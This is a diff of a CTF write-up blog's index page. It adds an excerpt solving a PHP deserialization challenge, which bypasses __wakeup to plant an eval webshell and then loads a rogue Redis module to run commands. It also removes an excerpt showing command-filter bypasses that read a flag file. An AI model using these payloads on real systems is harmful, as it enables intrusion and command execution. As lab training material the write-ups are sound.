@@ -131,6 +131,65 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/31/天翼杯2021-esay-eval-wp/" >天翼杯2021-esay_eval-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-31
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/364">题目链接</a>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显反序列化执行<code>5#eval</code>，但是需要绕过<code>8#__wakeup</code></p>
+<p><strong>wakeup绕过方式</strong>即让反序列化出来的类元素个数与实际元素个数不同</p>
+<p>尝试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;eval(\$_POST[&#x27;cmd&#x27;]);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>但过不了检测，会提示<code>you want to bypass wakeup ? no !</code></p>
+<p>代码中正则匹配了<code>&quot;B&quot;:x</code>和<code>&quot;A&quot;:x</code>类型中对应下标为1（即第2个，即A）的x个数是否为1，这里为2所以过不了检测；有两种绕过方法</p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>1可以过检测，那我们就让实际元素个数不为1（这里多加一个成员变量），也可以绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="string">&#x27;A&quot;:a&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;s:1:&quot;b&quot;;i:0;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>php对类名大小写不敏感，将<code>A1</code>替换为<code>a2</code>即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;a&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过后执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);&quot;</span>;&#125;&#125;&amp;cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p><code>phpinfo()</code>可以执行，但是<code>system</code>尝试发现被过滤</p>
+<p>连接蚁剑发现同一目录下有一个vim备份文件<code>config.php.swp</code>  vim打开后发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>给了<code>REDIS</code>的密码<code>you_cannot_guess_it</code></p>
+<p>从<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server%E4%B8%AD%E4%B8%8B%E8%BD%BD%60exp.so%60">https://github.com/Dliv3/redis-rogue-server中下载`exp.so`</a>  并在蚁剑中上传</p>
+<p>蚁剑插件商城中下载  Redis管理   然后右键链接选择该插件</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x1.png?raw=true" alt="m"></p>
+<p>点击新建然后输入密码即可连接成功，这时随便右键一个<code>db</code>选择执行命令</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x2.png?raw=true" alt="m"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /<span class="keyword">var</span>/www/html/exp.so</span><br><span class="line">system.exec <span class="string">&quot;ls /;cat /f*&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x3.png?raw=true" alt="m"></p>
+
+	
+	</div>
+  <a type="button" href="/2023/08/31/天翼杯2021-esay-eval-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/30/HDCTF2023-SearchMaster-wp/" >HDCTF2023-SearchMaster-wp</a>
 								</h3>
 							</div>
@@ -550,44 +609,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/21/SWPUCTF2021-finalrce-wp/" >SWPUCTF2021-finalrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-21
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/438">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>执行任意命令都无回显，尝试执行<code>?url=whoami;sleep 3</code>发现确实有延时，说明命令执行成功</p>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>tee命令用于读取标准输入的数据，并将其内容输出成文件，以下几种均可</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=l\s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=l<span class="string">&#x27;&#x27;</span>s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=l``s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=<span class="built_in">dir</span> / | <span class="built_in">tee</span> 1.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>1.txt</code>可以看到ls的结果，看到<code>flllllaaaaaaggggggg</code>；由于<code>la</code>被过滤，也要绕过</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?url=c<span class="string">&#x27;&#x27;</span>at /flllll\aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">tac</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">nl</span> /flllll????????????? | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">head</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">tail</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=tailf /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">sort</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>2.txt</code>即可看到flag</p>
-
-	
-	</div>
-  <a type="button" href="/2023/08/21/SWPUCTF2021-finalrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -641,7 +662,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>19</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>20</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -660,48 +681,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/CTF/">CTF<span>79</span></a></li>
-		
-			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
-		
-			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
-		
-			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
-		
 			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
-		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
-		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
-		
-			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
-		
-			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>3</span></a></li>
-		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
-		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
 			<li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
 		
-			<li><a href="/tags/nightmare/">nightmare<span>10</span></a></li>
+			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
 		
-			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
 		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>25</span></a></li>
 		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
+		
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+		
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
+		
+			<li><a href="/tags/flask-session/">flask session<span>2</span></a></li>
+		
+			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>50</span></a></li>
+		
+			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
+		
+			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>1</span></a></li>
+		
+			<li><a href="/tags/md5/">md5<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>103</span></a></li>
+		   <li><a href="/tags">...<span>105</span></a></li>
 		 
 		</ul>
 	</div>
@@ -712,6 +733,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/10/14/seccon2019-sum-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.3.seccon2019-...</a>
+      </li>
     
       <li>
         <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
@@ -727,10 +752,6 @@
     
       <li>
         <a href="/2023/10/07/UUCTF2022-ezrce-wp/" ><i class="fa fa-file-o"></i>UUCTF2022-ezrce-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/09/29/StarCTF2018-note-wp/" ><i class="fa fa-file-o"></i>StarCTF2018-note-wp</a>
       </li>
     
   </ul>
